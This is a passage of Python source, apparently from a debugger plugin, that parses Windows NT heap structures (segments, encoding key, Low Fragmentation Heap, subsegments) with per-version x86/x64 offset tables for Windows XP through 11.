				segaddr = entry - sle_offset
				seg = MnNTVistaSegment(segaddr)
				flink_raw = readPtrSizeBytes(entry)
				blink_raw = readPtrSizeBytes(entry + ptrsize)
				self.SegmentList[segaddr] = {
					"base": seg.BaseAddress,
					"end": seg.end,
					"pages": seg.NumberOfPages,
					"firstentry": seg.FirstEntry,
					"lastentry": seg.LastValidEntry,
					"flink": flink_raw - sle_offset if flink_raw != listhead else None,
					"blink": blink_raw - sle_offset if blink_raw != listhead else None,
				}
				entry = flink_raw
		except:
			pass

		return self.SegmentList

	def usesLFH(self):
		"""Check if this NT heap has LFH enabled.

		Return: bool, True if FrontEndHeapType == 0x2
		"""
		frontendheaptype = self.getFrontEndHeapType()
		return frontendheaptype == 0x2

	def getFrontEndHeapUsageData(self):
		"""Read the FrontEndHeapUsageData array (Vista/Win7).

		This array contains per-bucket activation counters that track
		how many allocations of each size class have been made.  When a
		counter exceeds a threshold the LFH is activated for that bucket.

		Return: list of 128 int counters, or empty list on failure.
		"""
		counters = []
		try:
			offset = getOsOffset("FrontEndHeapUsageData")
			data = dbg.readMemory(self.heapbase + offset, 128 * 2)
			for i in range(128):
				val = struct.unpack('<H', data[i*2:(i+1)*2])[0]
				counters.append(val)
		except:
			pass
		return counters


class MnNT8Heap(MnNTVistaHeap):
	"""
	NT Heap implementation for Windows 8 / 8.1.

	Inherits Win7 behaviour (XOR encoding, SegmentList, LFH).
	Offset differences are handled by getOsOffset().

	_HEAP (Windows 8 x86 selected fields)
	+0x000 Entry            : _HEAP_ENTRY
	+0x008 SegmentSignature : Uint4B
	+0x00c SegmentFlags     : Uint4B
	+0x010 SegmentListEntry : _LIST_ENTRY
	+0x018 Heap             : Ptr32 _HEAP
	+0x01c BaseAddress      : Ptr32 Void
	+0x020 NumberOfPages    : Uint4B
	+0x024 FirstEntry       : Ptr32 _HEAP_ENTRY
	+0x028 LastValidEntry   : Ptr32 _HEAP_ENTRY
	+0x040 Flags            : Uint4B
	+0x044 ForceFlags       : Uint4B
	+0x048 CompatibilityFlags : Uint4B
	+0x04c EncodeFlagMask   : Uint4B
	+0x050 Encoding         : _HEAP_ENTRY
	+0x060 Signature        : Uint4B
	+0x09c VirtualAllocdBlocks : _LIST_ENTRY
	+0x0a4 SegmentList      : _LIST_ENTRY
	+0x0c8 FreeLists        : _LIST_ENTRY
	+0x0d0 FrontEndHeap     : Ptr32 Void
	+0x0d6 FrontEndHeapType : UChar

	_HEAP (Windows 8 x64 selected fields)
	+0x000 Entry            : _HEAP_ENTRY (16 bytes: +0 PreviousBlockPrivateData, +8 compact header)
	+0x010 SegmentSignature : Uint4B
	+0x018 SegmentListEntry : _LIST_ENTRY
	+0x028 Heap             : Ptr64 _HEAP
	+0x030 BaseAddress      : Ptr64 Void
	+0x038 NumberOfPages    : Uint4B
	+0x040 FirstEntry       : Ptr64 _HEAP_ENTRY
	+0x048 LastValidEntry   : Ptr64 _HEAP_ENTRY
	+0x07c EncodeFlagMask   : Uint4B
	+0x080 Encoding         : _HEAP_ENTRY  (+0x088 = key bytes after PreviousBlockPrivateData)
	+0x098 Signature        : Uint4B
	+0x110 VirtualAllocdBlocks : _LIST_ENTRY
	+0x120 SegmentList      : _LIST_ENTRY
	+0x150 FreeLists        : _LIST_ENTRY
	+0x170 FrontEndHeap     : Ptr64 Void
	+0x17a FrontEndHeapType : UChar
	"""

	_chunk_entry_class = MnNT8ChunkEntry

	def __init__(self, address):
		super(MnNT8Heap, self).__init__(address)
		self.heap_version = HeapVersion.WIN8

	def getEncodingKey(self):
		"""Retrieve the Encoding key from the Win8+ NT heap header.

		On Win8+ x64, _HEAP_ENTRY is 16 bytes.  The Encoding field
		(at heapbase+0x080 on x64) is itself a _HEAP_ENTRY, so its
		first 8 bytes are PreviousBlockPrivateData (not the key).
		The actual 8-byte XOR key starts at heapbase+0x088.

		On x86 the layout is unchanged from Win7 (8-byte _HEAP_ENTRY,
		no PreviousBlockPrivateData prefix).

		Return: int, 8-byte XOR key (0 when encoding is disabled).
		"""
		self.Encoding = 0
		offset = archValue(0x4c, 0x7c)
		self.EncodeFlagMask = struct.unpack('<L', dbg.readMemory(self.heapbase + offset, 4))[0]
		if self.EncodeFlagMask == 0x100000:
			# x86: Encoding _HEAP_ENTRY starts at +0x050 (8 bytes, no prefix)
			# x64: Encoding _HEAP_ENTRY starts at +0x080 but first 8 bytes are
			#      PreviousBlockPrivateData; key bytes begin at +0x088.
			encoding_offset = archValue(0x50, 0x88)
			self.Encoding = struct.unpack('<Q', dbg.readMemory(self.heapbase + encoding_offset, 8))[0]
		return self.Encoding

	def getChunkHeaderDataOffset(self):
		"""Return the byte offset to the encoded compact header within a _HEAP_ENTRY.

		On Win8+ x64 each _HEAP_ENTRY is 16 bytes: the first 8 bytes are
		PreviousBlockPrivateData (stored in plain-text, not XOR-encoded).
		The encoded compact header (Size, Flags, SmallTagIndex, PreviousSize,
		SegmentOffset, UnusedBytes) begins at byte 8.

		On x86 (all versions) and Win7 x64 _HEAP_ENTRY is 8 bytes with no
		unencoded prefix, so the offset is 0.

		Return: int (0 for x86, 8 for x64).
		"""
		return archValue(0, 8)

	def getHeapSegmentList(self):
		"""Walk the Vista+ _HEAP.SegmentList doubly-linked list using MnNTVistaSegment.

		Return: dict keyed by segment address, each value is a dict:
		  - "base"       : int, BaseAddress
		  - "end"        : int, BaseAddress + NumberOfPages * 0x1000
		  - "pages"      : int, NumberOfPages
		  - "firstentry" : int, FirstEntry
		  - "lastentry"  : int, LastValidEntry
		"""
		if len(self.SegmentList) > 0:
			return self.SegmentList

		try:
			sle_offset = MnNTVistaSegment._offsets["SegmentListEntry"][MnNTVistaSegment._arch_index]

			listhead = self.heapbase + getOsOffset("SegmentList")
			entry = readPtrSizeBytes(listhead)

			ptrsize = archValue(4, 8)
			while entry != listhead:
				segaddr = entry - sle_offset
				seg = MnNTVistaSegment(segaddr)
				flink_raw = readPtrSizeBytes(entry)
				blink_raw = readPtrSizeBytes(entry + ptrsize)
				self.SegmentList[segaddr] = {
					"base": seg.BaseAddress,
					"end": seg.end,
					"pages": seg.NumberOfPages,
					"firstentry": seg.FirstEntry,
					"lastentry": seg.LastValidEntry,
					"flink": flink_raw - sle_offset if flink_raw != listhead else None,
					"blink": blink_raw - sle_offset if blink_raw != listhead else None,
				}
				entry = flink_raw
		except:
			pass

		return self.SegmentList


class MnNT10Heap(MnNT8Heap):
	"""
	NT Heap implementation for Windows 10.

	Inherits Win7 behaviour (XOR encoding, SegmentList, LFH).
	Offset differences are handled by getOsOffset() with build-based
	resolution for fields like FrontEndHeap and FrontEndHeapType.

	_HEAP (Windows 10 x86 selected fields)
	+0x000 Entry            : _HEAP_ENTRY
	+0x008 SegmentSignature : Uint4B
	+0x00c SegmentFlags     : Uint4B
	+0x010 SegmentListEntry : _LIST_ENTRY
	+0x018 Heap             : Ptr32 _HEAP
	+0x01c BaseAddress      : Ptr32 Void
	+0x020 NumberOfPages    : Uint4B
	+0x024 FirstEntry       : Ptr32 _HEAP_ENTRY
	+0x028 LastValidEntry   : Ptr32 _HEAP_ENTRY
	+0x040 Flags            : Uint4B
	+0x044 ForceFlags       : Uint4B
	+0x048 CompatibilityFlags : Uint4B
	+0x04c EncodeFlagMask   : Uint4B
	+0x050 Encoding         : _HEAP_ENTRY
	+0x060 Signature        : Uint4B
	+0x09c VirtualAllocdBlocks : _LIST_ENTRY
	+0x0a4 SegmentList      : _LIST_ENTRY
	+0x0c8 FreeLists        : _LIST_ENTRY
	+0x0d4 FrontEndHeap     : Ptr32 Void  (build < 17763)
	+0x0e4 FrontEndHeap     : Ptr32 Void  (build >= 17763)
	+0x0da FrontEndHeapType : UChar       (build < 17763)
	+0x0ea FrontEndHeapType : UChar       (build >= 17763)
	"""

	_chunk_entry_class = MnNT8ChunkEntry

	def __init__(self, address):
		super(MnNT10Heap, self).__init__(address)
		self.heap_version = HeapVersion.WIN10


class MnNT11Heap(MnNT10Heap):
	"""
	NT Heap implementation for Windows 11.

	Inherits Windows 10 behaviour.  The _HEAP layout is unchanged from
	Windows 10 across current Windows 11 releases.
	"""

	_chunk_entry_class = MnNT8ChunkEntry

	def __init__(self, address):
		super(MnNT11Heap, self).__init__(address)
		self.heap_version = HeapVersion.WIN11


class MnSegmentHeap(MnHeap):
	"""
	Segment Heap implementation (_SEGMENT_HEAP)
	"""

	def __init__(self, address):
		super(MnSegmentHeap, self).__init__(address)
		self.heap_type    = HeapType.SEGMENT
		self.heap_version = HeapVersion.UNKNOWN

	def getHeapType(self):
		return "Segment"


class MnVirtualAllocdBlocks:
	"""
	Represents a single _HEAP_VIRTUAL_ALLOC_ENTRY node from the NT heap
	VirtualAllocdBlocks doubly-linked list.

	Present in all NT heap versions (XP through Win11).  The PDB symbol
	_HEAP_VIRTUAL_ALLOC_ENTRY is absent in XP/Vista/7 ntdll but the layout
	is functionally identical — confirmed from Win8+ PDB dumps in
	logs/8/32, logs/8/64, logs/10/32, logs/10/64.

	_HEAP_VIRTUAL_ALLOC_ENTRY (x86)
	+0x000 Entry       : _LIST_ENTRY  (Flink@+0, Blink@+4)
	+0x008 ExtraStuff  : _HEAP_ENTRY_EXTRA
	+0x010 CommitSize  : Uint4B
	+0x014 ReserveSize : Uint4B
	+0x018 BusyBlock   : _HEAP_ENTRY

	_HEAP_VIRTUAL_ALLOC_ENTRY (x64)
	+0x000 Entry       : _LIST_ENTRY  (Flink@+0, Blink@+8)
	+0x010 ExtraStuff  : _HEAP_ENTRY_EXTRA
	+0x020 CommitSize  : Uint8B
	+0x028 ReserveSize : Uint8B
	+0x030 BusyBlock   : _HEAP_ENTRY
	"""

	_arch_index = 1 if arch == 64 else 0

	# Field offsets: (x86, x64)
	_offsets = {
		"Entry":       (0x000, 0x000),  # LIST_ENTRY (Flink = start of node)
		"ExtraStuff":  (0x008, 0x010),  # _HEAP_ENTRY_EXTRA
		"CommitSize":  (0x010, 0x020),  # Uint4B (x86) / Uint8B (x64)
		"ReserveSize": (0x014, 0x028),  # Uint4B (x86) / Uint8B (x64)
		"BusyBlock":   (0x018, 0x030),  # _HEAP_ENTRY
	}

	def __init__(self, entry_addr):
		self.address = entry_addr
		self.CommitSize  = readPtrSizeBytes(entry_addr + self._offsets["CommitSize"][self._arch_index])
		self.ReserveSize = readPtrSizeBytes(entry_addr + self._offsets["ReserveSize"][self._arch_index])
		self.BusyBlock   = entry_addr + self._offsets["BusyBlock"][self._arch_index]


class MnNTXPSegment:
	"""
	Represents a single _HEAP_SEGMENT from a Windows XP/2003 NT heap.
	Reads all fields directly from memory at instantiation time.
	"""

	# _HEAP_SEGMENT field offsets: (offset_x86, offset_x64)
	_offsets = {
		"Entry":                       (0x000, 0x000),
		"Signature":                   (0x008, 0x010),
		"Flags":                       (0x00c, 0x014),
		"Heap":                        (0x010, 0x018),
		"LargestUnCommittedRange":     (0x014, 0x020),
		"BaseAddress":                 (0x018, 0x028),
		"NumberOfPages":               (0x01c, 0x030),
		"FirstEntry":                  (0x020, 0x038),
		"LastValidEntry":              (0x024, 0x040),
		"NumberOfUnCommittedPages":    (0x028, 0x048),
		"NumberOfUnCommittedRanges":   (0x02c, 0x04c),
		"UnCommittedRanges":           (0x030, 0x050),
		"AllocatorBackTraceIndex":     (0x034, 0x058),
		"Reserved":                    (0x036, 0x05a),
		"LastEntryInSegment":          (0x038, 0x060),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, segaddr):
		self.address = segaddr
		ai = self._arch_index

		self.Signature                = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["Signature"][ai], 4))[0]
		self.Flags                    = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["Flags"][ai], 4))[0]
		self.Heap                     = readPtrSizeBytes(segaddr + self._offsets["Heap"][ai])
		self.LargestUnCommittedRange  = readPtrSizeBytes(segaddr + self._offsets["LargestUnCommittedRange"][ai])
		self.BaseAddress              = readPtrSizeBytes(segaddr + self._offsets["BaseAddress"][ai])
		self.NumberOfPages            = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfPages"][ai], 4))[0]
		self.FirstEntry               = readPtrSizeBytes(segaddr + self._offsets["FirstEntry"][ai])
		self.LastValidEntry           = readPtrSizeBytes(segaddr + self._offsets["LastValidEntry"][ai])
		self.NumberOfUnCommittedPages = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfUnCommittedPages"][ai], 4))[0]
		self.NumberOfUnCommittedRanges= struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfUnCommittedRanges"][ai], 4))[0]
		self.UnCommittedRanges        = readPtrSizeBytes(segaddr + self._offsets["UnCommittedRanges"][ai])
		self.AllocatorBackTraceIndex  = struct.unpack('<H', dbg.readMemory(segaddr + self._offsets["AllocatorBackTraceIndex"][ai], 2))[0]
		self.LastEntryInSegment       = readPtrSizeBytes(segaddr + self._offsets["LastEntryInSegment"][ai])
		self.end                      = self.BaseAddress + (self.NumberOfPages * 0x1000)


class MnNTVistaSegment:
	"""
	Represents a single _HEAP_SEGMENT from a Windows Vista NT heap.
	Used by MnNTVistaHeap and MnNT8Heap (all Vista+ versions share identical layout).

	_HEAP_SEGMENT (x86, Vista)
	+0x000 Entry                          : _HEAP_ENTRY
	+0x008 SegmentSignature               : Uint4B
	+0x00c SegmentFlags                   : Uint4B
	+0x010 SegmentListEntry               : _LIST_ENTRY
	+0x018 Heap                           : Ptr32 _HEAP
	+0x01c BaseAddress                    : Ptr32 Void
	+0x020 NumberOfPages                  : Uint4B
	+0x024 FirstEntry                     : Ptr32 _HEAP_ENTRY
	+0x028 LastValidEntry                 : Ptr32 _HEAP_ENTRY
	+0x02c NumberOfUnCommittedPages       : Uint4B
	+0x030 NumberOfUnCommittedRanges      : Uint4B
	+0x034 SegmentAllocatorBackTraceIndex : Uint2B
	+0x036 Reserved                       : Uint2B
	+0x038 UCRSegmentList                 : _LIST_ENTRY

	_HEAP_SEGMENT (x64, Vista)
	+0x000 Entry                          : _HEAP_ENTRY  (16 bytes)
	+0x010 SegmentSignature               : Uint4B
	+0x014 SegmentFlags                   : Uint4B
	+0x018 SegmentListEntry               : _LIST_ENTRY
	+0x028 Heap                           : Ptr64 _HEAP
	+0x030 BaseAddress                    : Ptr64 Void
	+0x038 NumberOfPages                  : Uint4B
	+0x040 FirstEntry                     : Ptr64 _HEAP_ENTRY
	+0x048 LastValidEntry                 : Ptr64 _HEAP_ENTRY
	+0x050 NumberOfUnCommittedPages       : Uint4B
	+0x054 NumberOfUnCommittedRanges      : Uint4B
	+0x058 SegmentAllocatorBackTraceIndex : Uint2B
	+0x05a Reserved                       : Uint2B
	+0x060 UCRSegmentList                 : _LIST_ENTRY
	"""

	# _HEAP_SEGMENT field offsets: (offset_x86, offset_x64)
	_offsets = {
		"Entry":                           (0x000, 0x000),
		"SegmentSignature":                (0x008, 0x010),
		"SegmentFlags":                    (0x00c, 0x014),
		"SegmentListEntry":                (0x010, 0x018),
		"Heap":                            (0x018, 0x028),
		"BaseAddress":                     (0x01c, 0x030),
		"NumberOfPages":                   (0x020, 0x038),
		"FirstEntry":                      (0x024, 0x040),
		"LastValidEntry":                  (0x028, 0x048),
		"NumberOfUnCommittedPages":        (0x02c, 0x050),
		"NumberOfUnCommittedRanges":       (0x030, 0x054),
		"SegmentAllocatorBackTraceIndex":  (0x034, 0x058),
		"Reserved":                        (0x036, 0x05a),
		"UCRSegmentList":                  (0x038, 0x060),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, segaddr):
		self.address = segaddr
		ai = self._arch_index

		self.SegmentSignature              = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["SegmentSignature"][ai], 4))[0]
		self.SegmentFlags                  = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["SegmentFlags"][ai], 4))[0]
		self.Heap                          = readPtrSizeBytes(segaddr + self._offsets["Heap"][ai])
		self.BaseAddress                   = readPtrSizeBytes(segaddr + self._offsets["BaseAddress"][ai])
		self.NumberOfPages                 = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfPages"][ai], 4))[0]
		self.FirstEntry                    = readPtrSizeBytes(segaddr + self._offsets["FirstEntry"][ai])
		self.LastValidEntry                = readPtrSizeBytes(segaddr + self._offsets["LastValidEntry"][ai])
		self.NumberOfUnCommittedPages      = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfUnCommittedPages"][ai], 4))[0]
		self.NumberOfUnCommittedRanges     = struct.unpack('<L', dbg.readMemory(segaddr + self._offsets["NumberOfUnCommittedRanges"][ai], 4))[0]
		self.SegmentAllocatorBackTraceIndex = struct.unpack('<H', dbg.readMemory(segaddr + self._offsets["SegmentAllocatorBackTraceIndex"][ai], 2))[0]
		self.end                           = self.BaseAddress + (self.NumberOfPages * 0x1000)


class MnNTVistaLFH:
	"""
	Represents _LFH_HEAP on Windows Vista/7.
	Lock is _RTL_CRITICAL_SECTION (0x18 bytes x86 / 0x28 bytes x64).
	Buckets array has 128 entries.
	"""

	# _LFH_HEAP field offsets: (offset_x86, offset_x64)
	_offsets = {
		"SubSegmentZones":      (0x018, 0x028),
		"ZoneBlockSize":        (0x020, 0x038),
		"Heap":                 (0x024, 0x040),
		"SegmentChange":        (0x028, 0x048),
		"SegmentCreate":        (0x02c, 0x04c),
		"SegmentInsertInFree":  (0x030, 0x050),
		"SegmentDelete":        (0x034, 0x054),
		"CacheAllocs":          (0x038, 0x058),
		"CacheFrees":           (0x03c, 0x05c),
		"UserBlockCache":       (0x040, 0x060),
		"Buckets":              (0x100, 0x1e0),
		"LocalData":            (0x300, 0x3e0),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, lfhbase):
		self.address = lfhbase
		ai = self._arch_index
		ptrsize = archValue(4, 8)

		self.Heap                  = readPtrSizeBytes(lfhbase + self._offsets["Heap"][ai])
		self.SubSegmentZones_Flink = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai])
		self.SubSegmentZones_Blink = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai] + ptrsize)
		self.ZoneBlockSize         = readPtrSizeBytes(lfhbase + self._offsets["ZoneBlockSize"][ai])
		self.SegmentChange         = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentChange"][ai], 4))[0]
		self.SegmentCreate         = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentCreate"][ai], 4))[0]
		self.SegmentInsertInFree   = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentInsertInFree"][ai], 4))[0]
		self.SegmentDelete         = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentDelete"][ai], 4))[0]
		self.CacheAllocs           = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["CacheAllocs"][ai], 4))[0]
		self.CacheFrees            = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["CacheFrees"][ai], 4))[0]
		self.Buckets               = lfhbase + self._offsets["Buckets"][ai]
		self.LocalData             = lfhbase + self._offsets["LocalData"][ai]


class MnNT8LFH:
	"""
	Represents _LFH_HEAP on Windows 8/8.1.
	Lock changed to _RTL_SRWLOCK (4 bytes x86 / 8 bytes x64).
	Buckets expanded to 129 entries; SegmentInfoArrays/AffinitizedInfoArrays added as pointer arrays.
	No MemoryPolicies field.
	"""

	# _LFH_HEAP field offsets: (offset_x86, offset_x64)
	_offsets = {
		"SubSegmentZones":             (0x004, 0x008),
		"Heap":                        (0x00c, 0x018),
		"NextSegmentInfoArrayAddress": (0x010, 0x020),
		"FirstUncommittedAddress":     (0x014, 0x028),
		"ReservedAddressLimit":        (0x018, 0x030),
		"SegmentCreate":               (0x01c, 0x038),
		"SegmentDelete":               (0x020, 0x03c),
		"MinimumCacheDepth":           (0x024, 0x040),
		"CacheShiftThreshold":         (0x028, 0x044),
		"SizeInCache":                 (0x02c, 0x048),
		"RunInfo":                     (0x030, 0x050),
		"UserBlockCache":              (0x038, 0x060),
		"Buckets":                     (0x1b8, 0x2a0),
		"SegmentInfoArrays":           (0x3bc, 0x4a8),
		"AffinitizedInfoArrays":       (0x5c0, 0x8b0),
		"LocalData":                   (0x7c8, 0xcc0),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, lfhbase):
		self.address = lfhbase
		ai = self._arch_index
		ptrsize = archValue(4, 8)

		self.Heap                        = readPtrSizeBytes(lfhbase + self._offsets["Heap"][ai])
		self.SubSegmentZones_Flink       = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai])
		self.SubSegmentZones_Blink       = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai] + ptrsize)
		self.NextSegmentInfoArrayAddress = readPtrSizeBytes(lfhbase + self._offsets["NextSegmentInfoArrayAddress"][ai])
		self.FirstUncommittedAddress     = readPtrSizeBytes(lfhbase + self._offsets["FirstUncommittedAddress"][ai])
		self.ReservedAddressLimit        = readPtrSizeBytes(lfhbase + self._offsets["ReservedAddressLimit"][ai])
		self.SegmentCreate               = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentCreate"][ai], 4))[0]
		self.SegmentDelete               = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentDelete"][ai], 4))[0]
		self.MinimumCacheDepth           = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["MinimumCacheDepth"][ai], 4))[0]
		self.CacheShiftThreshold         = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["CacheShiftThreshold"][ai], 4))[0]
		self.Buckets                     = lfhbase + self._offsets["Buckets"][ai]
		self.SegmentInfoArrays           = lfhbase + self._offsets["SegmentInfoArrays"][ai]
		self.AffinitizedInfoArrays       = lfhbase + self._offsets["AffinitizedInfoArrays"][ai]
		self.LocalData                   = lfhbase + self._offsets["LocalData"][ai]


class MnNT10LFH:
	"""
	Represents _LFH_HEAP on Windows 10/11.
	MemoryPolicies field inserted before Buckets (+0x1b8/+0x2a0).
	SegmentAllocator pointer added before LocalData.
	"""

	# _LFH_HEAP field offsets: (offset_x86, offset_x64)
	_offsets = {
		"SubSegmentZones":             (0x004, 0x008),
		"Heap":                        (0x00c, 0x018),
		"NextSegmentInfoArrayAddress": (0x010, 0x020),
		"FirstUncommittedAddress":     (0x014, 0x028),
		"ReservedAddressLimit":        (0x018, 0x030),
		"SegmentCreate":               (0x01c, 0x038),
		"SegmentDelete":               (0x020, 0x03c),
		"MinimumCacheDepth":           (0x024, 0x040),
		"CacheShiftThreshold":         (0x028, 0x044),
		"SizeInCache":                 (0x02c, 0x048),
		"RunInfo":                     (0x030, 0x050),
		"UserBlockCache":              (0x038, 0x060),
		"MemoryPolicies":              (0x1b8, 0x2a0),
		"Buckets":                     (0x1bc, 0x2a4),
		"SegmentInfoArrays":           (0x3c0, 0x4a8),
		"AffinitizedInfoArrays":       (0x5c4, 0x8b0),
		"SegmentAllocator":            (0x7c8, 0xcb8),
		"LocalData":                   (0x7d0, 0xcc0),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, lfhbase):
		self.address = lfhbase
		ai = self._arch_index
		ptrsize = archValue(4, 8)

		self.Heap                        = readPtrSizeBytes(lfhbase + self._offsets["Heap"][ai])
		self.SubSegmentZones_Flink       = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai])
		self.SubSegmentZones_Blink       = readPtrSizeBytes(lfhbase + self._offsets["SubSegmentZones"][ai] + ptrsize)
		self.NextSegmentInfoArrayAddress = readPtrSizeBytes(lfhbase + self._offsets["NextSegmentInfoArrayAddress"][ai])
		self.FirstUncommittedAddress     = readPtrSizeBytes(lfhbase + self._offsets["FirstUncommittedAddress"][ai])
		self.ReservedAddressLimit        = readPtrSizeBytes(lfhbase + self._offsets["ReservedAddressLimit"][ai])
		self.SegmentCreate               = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentCreate"][ai], 4))[0]
		self.SegmentDelete               = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["SegmentDelete"][ai], 4))[0]
		self.MinimumCacheDepth           = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["MinimumCacheDepth"][ai], 4))[0]
		self.CacheShiftThreshold         = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["CacheShiftThreshold"][ai], 4))[0]
		self.MemoryPolicies              = struct.unpack('<L', dbg.readMemory(lfhbase + self._offsets["MemoryPolicies"][ai], 4))[0]
		self.Buckets                     = lfhbase + self._offsets["Buckets"][ai]
		self.SegmentInfoArrays           = lfhbase + self._offsets["SegmentInfoArrays"][ai]
		self.AffinitizedInfoArrays       = lfhbase + self._offsets["AffinitizedInfoArrays"][ai]
		self.SegmentAllocator            = readPtrSizeBytes(lfhbase + self._offsets["SegmentAllocator"][ai])
		self.LocalData                   = lfhbase + self._offsets["LocalData"][ai]


class MnNTVistaSubSegment:
	"""
	Represents _HEAP_SUBSEGMENT on Windows Vista/7.
	No DelayFreeList field.

	x86 layout (0x20 bytes):
	+0x000 LocalInfo      : Ptr32
	+0x004 UserBlocks     : Ptr32
	+0x008 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x010 BlockSize      : Uint2B  (union with Alignment[2] at +0x010)
	+0x012 Flags          : Uint2B
	+0x014 BlockCount     : Uint2B
	+0x016 SizeIndex      : UChar
	+0x017 AffinityIndex  : UChar
	+0x018 SFreeListEntry : _SINGLE_LIST_ENTRY
	+0x01c Lock           : Uint4B

	x64 layout (0x30 bytes):
	+0x000 LocalInfo      : Ptr64
	+0x008 UserBlocks     : Ptr64
	+0x010 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x018 BlockSize      : Uint2B  (union with Alignment[2] at +0x018)
	+0x01a Flags          : Uint2B
	+0x01c BlockCount     : Uint2B
	+0x01e SizeIndex      : UChar
	+0x01f AffinityIndex  : UChar
	+0x020 SFreeListEntry : _SINGLE_LIST_ENTRY
	+0x028 Lock           : Uint4B
	"""

	# _HEAP_SUBSEGMENT field offsets: (offset_x86, offset_x64)
	_offsets = {
		"LocalInfo":      (0x000, 0x000),
		"UserBlocks":     (0x004, 0x008),
		"AggregateExchg": (0x008, 0x010),
		"BlockSize":      (0x010, 0x018),
		"Flags":          (0x012, 0x01a),
		"BlockCount":     (0x014, 0x01c),
		"SizeIndex":      (0x016, 0x01e),
		"AffinityIndex":  (0x017, 0x01f),
		"SFreeListEntry": (0x018, 0x020),
		"Lock":           (0x01c, 0x028),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, ssbase):
		self.address = ssbase
		ai = self._arch_index

		self.LocalInfo      = readPtrSizeBytes(ssbase + self._offsets["LocalInfo"][ai])
		self.UserBlocks     = readPtrSizeBytes(ssbase + self._offsets["UserBlocks"][ai])
		self.AggregateExchg = struct.unpack('<l', dbg.readMemory(ssbase + self._offsets["AggregateExchg"][ai], 4))[0]
		self.BlockSize      = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockSize"][ai], 2))[0]
		self.Flags          = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["Flags"][ai], 2))[0]
		self.BlockCount     = struct.unpack('<H', dbg.readMemory(ssbase + self._offsets["BlockCount"][ai], 2))[0]
		self.SizeIndex      = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["SizeIndex"][ai], 1))[0]
		self.AffinityIndex  = struct.unpack('<B', dbg.readMemory(ssbase + self._offsets["AffinityIndex"][ai], 1))[0]
		self.SFreeListEntry = readPtrSizeBytes(ssbase + self._offsets["SFreeListEntry"][ai])
		self.Lock           = struct.unpack('<L', dbg.readMemory(ssbase + self._offsets["Lock"][ai], 4))[0]


class MnNT8SubSegment:
	"""
	Represents _HEAP_SUBSEGMENT on Windows 8/8.1.
	DelayFreeList (_SLIST_HEADER) added at +0x008/+0x010, shifting AggregateExchg.
	SFreeListEntry is before Lock.

	x86 layout (0x24 bytes):
	+0x000 LocalInfo      : Ptr32
	+0x004 UserBlocks     : Ptr32
	+0x008 DelayFreeList  : _SLIST_HEADER (8 bytes)
	+0x010 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x014 BlockSize      : Uint2B  (union with Alignment[2] at +0x014)
	+0x016 Flags          : Uint2B
	+0x018 BlockCount     : Uint2B
	+0x01a SizeIndex      : UChar
	+0x01b AffinityIndex  : UChar
	+0x01c SFreeListEntry : _SINGLE_LIST_ENTRY
	+0x020 Lock           : Uint4B

	x64 layout (0x40 bytes):
	+0x000 LocalInfo      : Ptr64
	+0x008 UserBlocks     : Ptr64
	+0x010 DelayFreeList  : _SLIST_HEADER (16 bytes)
	+0x020 AggregateExchg : _INTERLOCK_SEQ (4 bytes)
	+0x024 BlockSize      : Uint2B  (union with Alignment[2] at +0x024)
	+0x026 Flags          : Uint2B
	+0x028 BlockCount     : Uint2B
	+0x02a SizeIndex      : UChar
	+0x02b AffinityIndex  : UChar
	+0x030 SFreeListEntry : _SINGLE_LIST_ENTRY
	+0x038 Lock           : Uint4B
	"""

	# _HEAP_SUBSEGMENT field offsets: (offset_x86, offset_x64)
	_offsets = {
		"LocalInfo":      (0x000, 0x000),
		"UserBlocks":     (0x004, 0x008),
		"DelayFreeList":  (0x008, 0x010),
		"AggregateExchg": (0x010, 0x020),
		"BlockSize":      (0x014, 0x024),
		"Flags":          (0x016, 0x026),
		"BlockCount":     (0x018, 0x028),
		"SizeIndex":      (0x01a, 0x02a),
		"AffinityIndex":  (0x01b, 0x02b),
		"SFreeListEntry": (0x01c, 0x030),
		"Lock":           (0x020, 0x038),
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, ssbase):
		self.address = ssbase
		ai = self._arch_index

		self.LocalInfo      = readPtrSizeBytes(ssbase + self._offsets["LocalInfo"][ai])
